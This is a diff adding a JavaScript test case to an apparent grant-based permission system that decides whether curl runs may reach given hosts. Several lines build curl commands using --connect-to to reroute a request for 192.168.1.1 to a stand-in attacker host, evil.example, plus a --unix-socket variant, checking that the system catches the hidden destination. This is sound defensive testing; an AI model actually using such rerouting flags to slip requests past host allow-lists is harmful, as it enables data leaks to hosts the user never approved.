@@ -564,6 +564,22 @@ console.log('⑫ ROUND 2 BLOCKER — a grant covers the run\'s DESTINATIONS, not
   w2.useGrants.addMember(e2.id, { kind: 'conversation', key: 'cid-asker-1' }, { hosts: ['192.168.1.1'] });
   const leak = await runAnswered(w2, CURL(e2.ref, '--connect-to', '::evil.example:443', 'https://192.168.1.1/'));
   ok(leak.r.ok && leak.r.by === 'grant' && !leak.card, 'MUTANT «grant on shape.hosts only» (the door before this round): the connect-to run LEAKS to evil.example with no card — the shipped door draws the card (④)', { by: leak.r.by });
+  // int361 — 主开发's ruling (C): «always» ELIGIBILITY and DESTINATION KNOWLEDGE are two facts. A routing flag whose hosts the reader
+  // READS withholds «always» (vault-agent-own r25) yet a grant naming EVERY host covers the run (this lane since r2); one it cannot read
+  // (--unix-socket) is opaque for both roads.
+  const w3 = await world(); const e3 = entryOf(w3);
+  w3.door.setRunnable({ id: e3.id, on: true, reauthed: true });
+  w3.useGrants.addMember(e3.id, { kind: 'conversation', key: 'cid-asker-1' }, { hosts: ['192.168.1.1', 'evil.example:443'] });
+  const ctArgv = ['curl', '--connect-to', '::evil.example:443', 'https://192.168.1.1/'], ctS = destOf(ctArgv);
+  const both = await runAnswered(w3, CURL(e3.ref, '--connect-to', '::evil.example:443', 'https://192.168.1.1/'));
+  const one = await runAnswered(w, CURL(e.ref, '--connect-to', '::evil.example:443', 'https://192.168.1.1/'));
+  const usS = destOf(['curl', '--unix-socket', '/tmp/s', 'https://192.168.1.1/']);
+  const us = await runAnswered(w3, CURL(e3.ref, '--unix-socket', '/tmp/s', 'https://192.168.1.1/'));
+  ok(both.r.ok && both.r.by === 'grant' && !both.card && ctS.always === false && !ctS.dest.opaque
+    && one.card && !one.r.ok && one.r.by !== 'grant'
+    && us.card && !us.r.ok && us.r.by !== 'grant' && usS.always === false && usS.dest.opaque === true,
+    'ruling (C): curl --connect-to with a grant naming BOTH hosts ⇒ by:grant AND «always» not offered; a grant naming one host ⇒ the card; curl --unix-socket ⇒ the card, «always» not offered (eligibility ≠ destination knowledge)',
+    { both: both.r.by, bothCard: !!both.card, ctAlways: ctS.always, oneCard: !!one.card, usCard: !!us.card, usAlways: usS.always, usOpaque: usS.dest.opaque });
 }
 
 console.log('⑬ ROUND 2 — OFF suspends every grant (kept, not deleted); ON restores it');
